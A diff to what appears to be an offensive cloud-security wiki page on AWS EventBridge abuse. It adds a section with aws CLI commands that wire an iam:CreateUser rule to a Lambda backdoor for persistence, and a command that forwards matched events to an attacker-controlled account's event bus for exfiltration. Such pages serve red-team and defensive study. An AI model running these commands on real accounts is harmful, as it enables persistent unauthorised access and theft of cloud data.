@@ -29,6 +29,23 @@ aws events put-targets --rule exfil --targets \
   'Id=1,Arn=<api-destination-arn>,RoleArn=<role>'
 ```
 
+## Reacting to events as persistence
+
+Point a rule at a Lambda [backdoor](code-and-layers.md) so a chosen API call re-establishes access: a rule matching `iam:CreateUser` or a console login re-invokes the function whenever that event appears, the pattern Pacu's `lambda__backdoor_new_*` modules automate.
+
+```bash
+aws events put-rule --name react --event-pattern \
+  '{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventName":["CreateUser"]}}'
+aws events put-targets --rule react --targets "Id=1,Arn=<backdoor-fn-arn>"
+```
+
+A target can also be an **event bus in another account**, so a forwarding rule ships matched events straight to attacker-controlled infrastructure:
+
+```bash
+aws events put-targets --rule exfil --targets \
+  'Id=1,Arn=arn:aws:events:<region>:<attacker-acct>:event-bus/default,RoleArn=<role>'
+```
+
 ## Exploitation notes
 
 - A rule with a broad `--event-pattern` matches nearly every event on the bus, so a forwarding target becomes a durable event-exfiltration channel.
@@ -43,3 +60,6 @@ aws events put-targets --rule exfil --targets \
 
 - [AWS: EventBridge rule targets](https://docs.aws.amazon.com/eventbridge/latest/userguide/eb-targets.html)
 - [HackTricks Cloud: AWS EventBridge](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
+- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
+- [Rhino Security Labs: AWS privilege escalation](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
+- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
